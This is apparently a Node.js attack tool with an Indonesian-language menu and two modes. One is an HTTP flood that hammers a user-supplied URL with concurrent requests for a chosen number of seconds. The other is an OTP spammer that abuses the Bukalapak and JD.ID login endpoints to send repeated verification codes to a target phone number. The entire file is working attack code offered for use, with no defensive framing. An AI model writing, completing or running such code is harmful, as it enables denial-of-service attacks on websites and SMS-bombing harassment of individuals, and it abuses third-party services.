const readline = require("readline");
const os = require("os");
const https = require("https");
const querystring = require("querystring");

function getPublicIP(callback) {
  https.get("https://api.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback("Tidak diketahui");
      }
    });
  }).on("error", () => {
    callback("Gagal mengambil IP");
  });
}

function runFlood(targetUrl, duration) {
  const endTime = Date.now() + duration * 1000;
  let count = 0;
  let success = 0;
  let failed = 0;

  console.log(`[!] Menjalankan flood ke ${targetUrl} selama ${duration} detik...\n`);

  function sendRequest() {
    if (Date.now() > endTime) {
      const percent = ((success / count) * 100).toFixed(1);
      const status = percent >= 80 ? "Ganas" : "Lemah";

      console.log("\n==============================");
      console.log(`[✓] Flood selesai`);
      console.log(`[+] Total   : ${count}`);
      console.log(`[+] Sukses  : ${success}`);
      console.log(`[+] Gagal   : ${failed}`);
      console.log(`[+] Persentase : ${percent}% (${status})`);
      console.log("==============================\n");
      return;
    }

    try {
      const req = https.request(targetUrl, { method: "GET" }, (res) => {
        res.on("data", () => {});
        res.on("end", () => {
          success++;
          count++;
          process.stdout.write(`[+] Sukses (${success}) | Gagal (${failed})\r`);
          sendRequest();
        });
      });

      req.on("error", () => {
        failed++;
        count++;
        process.stdout.write(`[!] Sukses (${success}) | Gagal (${failed})\r`);
        sendRequest();
      });

      req.end();
    } catch {
      failed++;
      count++;
      process.stdout.write(`[!] Sukses (${success}) | Gagal (${failed})\r`);
      sendRequest();
    }
  }

  for (let i = 0; i < 20; i++) {
    sendRequest();
  }
}

// OTP Spam pakai 2 API
function runOtpSpam(nomor, jumlah) {
  let count = 0;

  const apis = [apiBukalapak, apiJDid];

  function sendNext() {
    if (count >= jumlah) {
      console.log(`\n[✓] Selesai spam ${jumlah} OTP ke ${nomor}`);
      return;
    }

    const apiFunc = apis[count % apis.length];
    apiFunc(nomor, () => {
      count++;
      setTimeout(sendNext, 2000); // Jeda antar request
    });
  }

  console.log(`[!] Menjalankan spam OTP ke ${nomor} sebanyak ${jumlah}x`);
  sendNext();
}

function apiBukalapak(nomor, callback) {
  const formatted = nomor.startsWith("0") ? "62" + nomor.slice(1) : nomor;

  const options = {
    hostname: "api.bukalapak.com",
    path: "/v2/authenticate.json",
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": "Mozilla/5.0"
    }
  };

  const postData = querystring.stringify({ phone: formatted });

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      if (res.statusCode === 200 || data.includes("OTP")) {
        console.log(`[+] [Bukalapak] OTP terkirim ke ${nomor}`);
      } else {
        console.log(`[!] [Bukalapak] Gagal kirim OTP`);
      }
      callback();
    });
  });

  req.on("error", () => {
    console.log(`[!] [Bukalapak] Error`);
    callback();
  });

  req.write(postData);
  req.end();
}

function apiJDid(nomor, callback) {
  const formatted = nomor.startsWith("0") ? nomor : "0" + nomor.slice(2);
  const options = {
    hostname: "passport.jd.id",
    path: `/sso/getMobileCode?mobile=${formatted}&type=register`,
    method: "GET",
    headers: {
      "User-Agent": "Mozilla/5.0"
    }
  };

  const req = https.request(options, (res) => {
    res.on("data", () => {});
    res.on("end", () => {
      if (res.statusCode === 200) {
        console.log(`[+] [JD.ID] OTP terkirim ke ${nomor}`);
      } else {
        console.log(`[!] [JD.ID] Gagal kirim OTP`);
      }
      callback();
    });
  });

  req.on("error", () => {
    console.log(`[!] [JD.ID] Error`);
    callback();
  });

  req.end();
}

function showMenu(ip) {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("IP Address  :", ip);
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood");
  console.log("2. Spam OTP");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL (https://...): ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            runFlood(url, parseInt(time));
            rl.close();
          });
        });
        break;

      case '2':
        rl.question("Nomor HP: ", (nomor) => {
          rl.question("Jumlah spam: ", (jumlah) => {
            runOtpSpam(nomor, parseInt(jumlah));
            rl.close();
          });
        });
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

getPublicIP((ip) => {
  showMenu(ip);
});